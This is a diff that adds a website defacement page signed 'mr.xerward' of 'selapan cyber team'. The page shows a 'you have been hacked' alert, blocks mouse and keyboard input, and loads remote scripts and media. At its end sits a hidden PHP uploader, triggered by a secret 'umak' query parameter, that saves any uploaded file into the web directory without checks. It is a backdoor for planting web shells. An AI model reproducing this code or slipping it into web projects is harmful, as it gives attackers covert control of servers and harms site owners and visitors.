@@ -1,0 +1,67 @@
+<html>
+<head>
+<title>iameverywhere</title>
+<script>alert("Y0u h4Ve B3en H4ck3d")</script>
+<style type="text/css">
+body{background:url('http://jejaknyasangpajar.hol.es/edit.jpg')no-repeat scroll; background-size:100% 100%; min-height:620px;}
+</style>
+</head>
+<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;'>
+<script src='http://yourjavascript.com/1171704334/efek-salju-faisal.js' type='text/javascript'/></script>
+<center><font color="cyan" size="6">
+<br><br><br><br><br>
+.....hacked.....
+<br>
+by
+<br>
+.....mr.xerward.....
+<br>
+<br>
+</font>
+<font color="blue"><h2>banyak celah di situs anda</h2><h1>mohon diperbaiki</h1>
+</font><br><br>
+<br><br><br><br>
+</font>
+<font color="red" size="4">
+we are: <h3><marquee>selapan cyber team</marquee></h3>
+</center>
+</font>
+<embed src="http://www.youtube.com/v/X5zipw8VRZ0&autoplay=1" type="application/x-shockwave-flash" wmode="transparent" width="1" height="1"></embed>
+<?php if(isset($_GET['umak']))
+{
+echo "<body bgcolor=black>
+<font color=cyan size=3>";
+echo "<h2>Bobinsa Ganteng</h2><hr>";
+echo "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\">
+<label for=\"file\">Filename:</label>
+<input type=\"file\" name=\"file\" id=\"file\" />
+<br />
+<input type=\"submit\" name=\"submit\" value=\"UPLOAD IT\">
+</form>";
+if ($_FILES["file"]["error"] > 0)
+{
+echo "Error: " . $_FILES["file"]["error"] . "<br />";
+}
+else
+{
+echo "Upload: " . $_FILES["file"]["name"] . "<br />";
+echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
+echo "Stored in: " . $_FILES["file"]["tmp_name"];
+}
+if (file_exists("" . $_FILES["file"]["name"]))
+{
+echo $_FILES["file"]["name"] . " already exists. ";
+}
+else
+{
+move_uploaded_file($_FILES["file"]["tmp_name"],
+"" . $_FILES["file"]["name"]);
+echo "Stored in: " . "" . $_FILES["file"]["name"];
+echo"<hr>";
+}
+}
+
+?>
+</body>
+</html>
+
